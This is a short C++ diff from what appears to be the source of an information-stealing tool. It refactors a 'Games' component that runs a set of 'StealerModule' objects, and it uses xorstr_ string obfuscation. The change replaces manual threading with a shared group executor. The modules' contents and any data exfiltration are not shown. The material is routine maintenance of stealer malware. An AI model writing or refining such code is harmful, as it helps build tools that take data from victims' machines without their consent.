@@ -15,17 +15,5 @@ Games::Games() {
 
 void Games::execute(fs::path &root) {
     fs::path games_path = root / xorstr_("Games");
-    std::vector<std::thread> threads;
-
-    for(StealerModule* module : this->modules) {
-        threads.emplace_back([module, &games_path]() {
-            module->execute(games_path);
-        });
-    }
-
-    for(auto& thread : threads) {
-        if (thread.joinable()) {
-            thread.join();
-        }
-    }
+    StealerModuleGroup::execute(games_path);
 }
